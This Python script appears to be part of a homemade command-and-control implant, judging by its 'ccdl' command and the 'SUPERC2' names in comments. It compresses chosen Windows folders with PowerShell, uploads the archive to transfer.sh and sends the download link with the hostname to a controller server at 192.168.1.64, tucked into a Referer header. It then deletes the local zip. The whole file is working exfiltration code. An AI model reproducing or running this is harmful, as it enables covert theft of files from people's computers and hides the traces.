#!/usr/bin/python3

from subprocess import Popen, PIPE, STDOUT
import requests
from pathlib import Path
import socket

cmdstr = "ccdl 'C:\\Users\\narek\\Desktop\\tmpa' 'C:\\Users\\narek\\Desktop\\tmpb'"

a = 'C:\\Users\\narek\\Desktop\\tmpa'
b = 'C:\\Users\\narek\\Desktop\\tmpb'

cmdsplit = cmdstr.split(' ')
cmdexe = cmdsplit[0]
cmdargs = cmdsplit[1:]
cmdargs_str = (cmdsplit)[1:]

# handle ccdl download function
if (cmdexe == "ccdl"):
	
	allpaths = ""
	for i in range(0, len(cmdargs_str)):
		allpaths += "(Resolve-Path " + cmdargs_str[i] + ")"
		# allpaths += "[System.IO.DirectoryInfo]" + cmdargs_str[i]
		if i != len(cmdargs_str) - 1:
			allpaths += ", "

	print(allpaths)
	

	# =====================================
	# create the zip with powershell
	# =====================================

	# si un Chemin fail, tout fail
	# run = Popen("powershell.exe -Command \"Compress-Archive -Path (Resolve-Path " + b +") -DestinationPath SUPERC3.zip -Force\"",
	# run = Popen("powershell.exe -Command \"Compress-Archive -Path (Resolve-Path " + a + "), (Resolve-Path " + b + ") -DestinationPath SUPERC3.zip -Force\"",
	run = Popen("powershell.exe -Command \"Compress-Archive -Path " + allpaths + " -DestinationPath tmp.zip -Force\"",
		 shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
	out = run.stdout.read()
	print(out)

	# =====================================
	# transfer the zip with transfersh
	# =====================================
	if len(out) == 0:
		transfersh_url = "https://transfer.sh"
		filename = "tmp.zip"
		headers = {}
		download_url = ""

		with open(filename, 'rb') as data:
			conf_file = {filename: data}
			headers['Max-Days'] = str(1)
			r = requests.post(transfersh_url, files=conf_file, headers=headers)
			download_url = r.text
			# print("Download from here: %s" % (download_url))

		# =====================================
		# send transfersh link via requests.get / post
		# =====================================
		headers = {}
		hostname = socket.gethostname()
		hostname_pattern = 'host:%s-00' % hostname
		# remove \n from header value download_url
		download_url = download_url.replace("\n", "")
		transfersh_header = {'Referer': hostname_pattern+" -- "+download_url}
		cache_control = {'Cache-Control': 'no-cache'}

		headers.update(transfersh_header)
		headers.update(cache_control)

		cmd_url_answer = 'http://192.168.1.64:5000/answer'
		push = requests.get(cmd_url_answer, headers=headers)
		print("============\nRequest :")
		print(push)
	
	# =====================================
	# delete the zip via powershell
	# =====================================
	run = Popen("powershell.exe -Command \"Remove-Item tmp.zip \"",
		 shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
	out = run.stdout.read()
	print(out)




	# for i in range(0, len(cmdsplit)):
	# 	cmdsplit[i] = cmdsplit[i].replace('"', '\"\"')
	# 	cmdsplit[i] = cmdsplit[i].replace('\\\\', '\\')
	# 	cmdsplit[i] = str(Path(cmdsplit[i]))

	# # double the quotes
	# pscmd = ', '.join(cmdsplit[1:])

	# print(cmdsplit)


	# # print('Compress-Archive -Path ' + ', '.join(cmdsplit[1:]) + ' -DestinationPath $($env:LOCALAPPDATA)\\Temp\\SUPERC2.zip')
	# # print("powershell.exe -Command \"Compress-Archive -Path " + pscmd + " -DestinationPath '" + str(Path("C:\\Users\\narek\\AppData\\Local\\Temp\\SUPERC2.zip")) + "'\"")

	
	# # print("powershell.exe -Command 'Compress-Archive -Path " + pscmd + " -DestinationPath \"\"" + str(Path("C:\\Users\\narek\\AppData\\Local\\Temp\\SUPERC2.zip")) + "\"\"'")
	# run = Popen("powershell.exe -Command 'Compress-Archive -Path " + pscmd + " -DestinationPath \"\"" + str(Path('$($env:LOCALAPPDATA)\\Temp\\SUPERC2.zip')) + "\"\"'", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
	# # print(run)
	# out = run.stdout.read()
	# print(out)


	# cmdsplit = cmd.split
	# rundl = Popen(cmdsplit, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()

